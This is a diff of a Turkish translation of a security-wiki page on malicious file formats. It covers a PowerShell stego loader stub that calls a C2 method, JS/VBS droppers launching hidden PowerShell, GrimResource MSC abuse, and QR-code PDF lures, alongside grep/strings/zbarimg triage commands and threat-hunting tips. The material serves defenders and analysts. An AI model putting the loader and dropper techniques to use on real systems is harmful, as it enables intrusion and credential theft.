-<summary>PowerShell stego payload çıkarıcı ve loader</summary>
+<summary>PowerShell stego payload extractor and loader</summary>
 
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
@@ -340,9 +352,9 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 </details>
 
 Notlar
-- Bu, ATT&CK T1027.003'tür (steganografi/işaretleyici gizleme).<sup>[[6]](#references)</sup> İşaretleyiciler kampanyalar arasında değişiklik gösterir.
-- AMSI/ETW bypass ve string deobfuscation, assembly yüklenmeden önce yaygın olarak uygulanır.
-- Tehdit avı: İndirilen görselleri bilinen ayırıcılar için tarayın; görsellere erişip hemen Base64 blob'larını çözen PowerShell işlemlerini belirleyin.
+- Bu, ATT&CK T1027.003'tür (steganografi/işaretçi gizleme).<sup>[[6]](#references)</sup> İşaretçiler kampanyalara göre değişir.
+- AMSI/ETW bypass ve string obfuscation, assembly yüklenmeden önce yaygın olarak uygulanır.
+- Tehdit avı: İndirilen görselleri bilinen ayraçlar için tarayın; görsellere erişip hemen Base64 blob'larını decode eden PowerShell'i belirleyin.
 
 Ayrıca stego araçlarına ve carving tekniklerine bakın:
 
@@ -352,23 +364,23 @@ Ayrıca stego araçlarına ve carving tekniklerine bakın:
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-Yinelenen bir ilk aşama, bir arşiv içinde sunulan küçük ve yoğun biçimde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini çözmek ve HTTPS üzerinden sonraki aşamayı başlatmak için PowerShell'i `-nop -w hidden -ep bypass` seçenekleriyle çalıştırmaktır.<sup>[[5]](#references)</sup>
+Yinelenen bir ilk aşama, bir arşiv içinde gönderilen, küçük ve yoğun şekilde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki aşamayı başlatmak için PowerShell'i `-nop -w hidden -ep bypass` ile çalıştırmaktır.<sup>[[5]](#references)</sup>
 
-İskelet mantığı (soyut):
-- Kendi dosyasının içeriğini oku
+İskelet mantık (soyut):
+- Kendi dosya içeriğini oku
 - Gereksiz string'ler arasındaki Base64 blob'unu bul
-- ASCII PowerShell'e çöz
-- `wscript.exe`/`cscript.exe` ile `powershell.exe` çağırarak çalıştır
+- ASCII PowerShell'e decode et
+- `wscript.exe`/`cscript.exe` kullanarak `powershell.exe` çalıştır
 
-Tehdit avı göstergeleri
-- Komut satırında `-enc`/`FromBase64String` bulunan `powershell.exe` süreçlerini başlatan arşivlenmiş JS/VBS ekleri.
-- Kullanıcı geçici dizinlerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.
+Tehdit avı ipuçları
+- Komut satırında `-enc`/`FromBase64String` içeren `powershell.exe` süreçlerini başlatan, arşivlenmiş JS/VBS ekleri.
+- Kullanıcı temp dizinlerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.
 
-## Çalıştırma kapsayıcıları olarak MSC belgeleri (GrimResource)
+## MSC belgeleri yürütme kapsayıcıları olarak (GrimResource)
 
-Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` ile açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` kaynağına yönelik `StringTable` referansını silah olarak kullanır; böylece kullanıcı hazırlanmış konsolu açtığında JavaScript `mmc.exe` içinde çalışır. Gözlemlenen örneklerde, olağan Office-macro yolu kullanılmadan bir .NET payload'u oluşturmak için `transformNode` tabanlı obfuscation ile **DotNetToJScript** birlikte kullanılmıştır.<sup>[[9]](#references)</sup>
+Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` tarafından açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` kaynağına yönelik bir `StringTable` referansını silahlandırır; böylece kullanıcının hazırlanmış konsolu açması, JavaScript'in `mmc.exe` içinde çalışmasına neden olur. Gözlemlenen örneklerde, olağan Office-macro yolunu kullanmadan bir .NET payload'ı başlatmak için `transformNode` tabanlı obfuscation, **DotNetToJScript** ile birleştirilmiştir.<sup>[[9]](#references)</sup>
 
-Statik triage için güvenilmeyen bir MSC'yi metin olarak ele alın ve üzerine **çift tıklamayın**:<sup>[[9]](#references)</sup>
+Statik ilk inceleme için güvenilmeyen bir MSC'yi metin olarak ele alın ve üzerine **çift tıklamayın**:<sup>[[9]](#references)</sup>
 
 ```bash
 file lure.msc
@@ -377,13 +389,13 @@ grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64S
 strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
 ```
 
-Yüksek sinyalli runtime pivot’ları arasında `mmc.exe` dosyasının CLR veya script bileşenlerini yüklemesi, ağ bağlantıları kurması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir çalıştırılabilir dosya başlatması bulunur. Biçim meşru olduğundan, tespitler her MSC dosyasını engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** ile ilişkilendirilmelidir.<sup>[[9]](#references)</sup>
+Yüksek sinyalli runtime pivotları arasında `mmc.exe`’nin CLR veya script bileşenlerini yüklemesi, ağ bağlantıları kurması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir executable başlatması yer alır. Format meşru olduğundan, tespitler her MSC’yi engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** ilişkisini kurmalıdır.<sup>[[9]](#references)</sup>
 
 ## PDF/QR yönlendiricileri ve payload gating
 
-Bir PDF'nin yararlı olması için exploit içermesi gerekmez. Yakın tarihli kampanyalar, zararsız görünen bir belgeye **QR kodu veya sıradan bir bağlantı** yerleştiriyor, tarayıcı oturumunu e-posta kontrollerinin dışına taşıyor ve hedefi alıcının adresine göre kişiselleştiriyor. Microsoft, QR URL'lerinin alıcıya özel olduğu ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendirdiği 2025 tarihli PDF'leri belgeledi; paralel bir zincirde ise IP/ortam filtrelemesi kullanılarak seçili ziyaretçilere bir JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>
+Bir PDF’nin işe yaraması için exploit içermesi gerekmez. Güncel kampanyalarda zararsız görünen bir belgeye **QR code veya sıradan bir bağlantı** yerleştirilir, tarayıcı oturumu e-posta kontrollerinin dışına yönlendirilir ve hedef, alıcının adresine göre kişiselleştirilir. Microsoft, QR URL’leri alıcıya özel olan ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendiren 2025 tarihli PDF’leri belgeledi; paralel bir zincirde ise IP/ortam gating kullanılarak seçili ziyaretçilere JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>
 
-Hem PDF eylemlerini hem de görüntülenen QR kodlarını inceleyin. QR kodu, çıkarılabilir bir görüntü olarak saklanmak yerine vektörlerle çizilmiş olabilir; bu nedenle gömülü görüntüleri çıkarmanın yanı sıra her sayfayı rasterleştirin:
+Hem PDF eylemlerini hem de oluşturulan QR code’ları triage edin. Bir QR, çıkarılabilir görüntü olarak saklanmak yerine vektör olarak çizilmiş olabilir; bu nedenle gömülü görüntüleri çıkarmanın yanı sıra her sayfayı rasterleştirin:
 
 ```bash
 pdfid.py lure.pdf
@@ -395,11 +407,11 @@ pdftoppm -png -r 300 lure.pdf page
 zbarimg --quiet image-*.png page-*.png
 ```
 
-İzolasyonlu bir analiz sisteminden, kimlik doğrulaması yapmadan çözümlenen hedefleri ve yönlendirmeleri inceleyin. Yararlı avlanma özellikleri arasında gövdesi neredeyse boş, yalnızca QR kodu içeren PDF'ler; sorgu parametresine gömülü alıcı e-posta adresi; saygın barındırma hizmetleri üzerinden yapılan birden fazla yönlendirme ve IP, coğrafi konum, çerezler, yönlendiren sayfa veya user agent'a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca yem içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>
+Yalıtılmış bir analiz sisteminden kimlik doğrulaması yapmadan çözülmüş hedefleri ve yönlendirmeleri inceleyin. Araştırmada işe yarayan özellikler arasında gövdesi neredeyse boş e-postalarla gönderilen, yalnızca QR kodu içeren PDF’ler; sorgu parametresine gömülü alıcı e-posta adresi; saygın barındırma hizmetleri üzerinden yapılan birden fazla yönlendirme ve IP’ye, coğrafi konuma, çerezlere, yönlendiren sayfaya veya user agent’a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca yem içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>
 
 ## NTLM hash'lerini çalmak için Windows dosyaları
 
-**NTLM creds çalınabilecek yerler** hakkındaki sayfaya bakın:
+**NTLM kimlik bilgilerini çalınabilecek yerler** hakkındaki sayfaya bakın:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
@@ -411,14 +423,19 @@ zbarimg --quiet image-*.png page-*.png
 ## References
 
 - [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [2] [Check Point Research – ZipLine Kampanyası: ABD Şirketlerini Hedef Alan Gelişmiş Bir Phishing Saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [3] [Rapid7 – Malware à la Mode: Çin Temalı Bir Loader Zinciri Boyunca Dropping Elephant Taktiklerinin İzlenmesi](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
-- [4] [Hijack the TypeLib – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [5] [Unit 42 – PhantomVAI Loader Çeşitli Infostealer'lar Dağıtıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
-- [6] [MITRE ATT&CK – Steganografi (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [2] [Check Point Research – ZipLine Campaign: ABD şirketlerini hedef alan gelişmiş bir phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Rapid7 – Malware à la Mode: Çin temalı bir loader zinciri üzerinden Dropping Elephant’ın taktiklerini izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
+- [4] [Hijack the TypeLib – Yeni COM persistence tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar yayıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 - [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
-- [8] [MITRE ATT&CK – Güvenilir Geliştirici Araçları Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
+- [8] [MITRE ATT&CK – Güvenilir geliştirici yardımcı programları proxy execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
 - [9] [Elastic Security Labs – GrimResource: İlk erişim ve kaçınma için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
-- [10] [Microsoft Security Blog – Tehdit aktörleri, vergi temalı phishing kampanyaları dağıtmak için vergi sezonundan yararlanıyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
-- [11] [Cisco Talos – UAT-11587 dağıtım zinciri ve Antino backdoor'u](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
+- [10] [Microsoft Security Blog – Tehdit aktörleri vergi sezonunu kullanarak vergi temalı phishing kampanyaları yürütüyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
+- [11] [Cisco Talos – UAT-11587 teslimat zinciri ve Antino backdoor'u](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
+- [12] [FortiGuard Labs - BITTER, PapRAT ile cephaneliğini genişletiyor](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
+- [13] [Microsoft Learn - ftp komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
+- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
+- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
+- [16] [Microsoft Learn - Custom Action dönüş işleme seçenekleri](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
 {{#include ../../banners/hacktricks-training.md}}
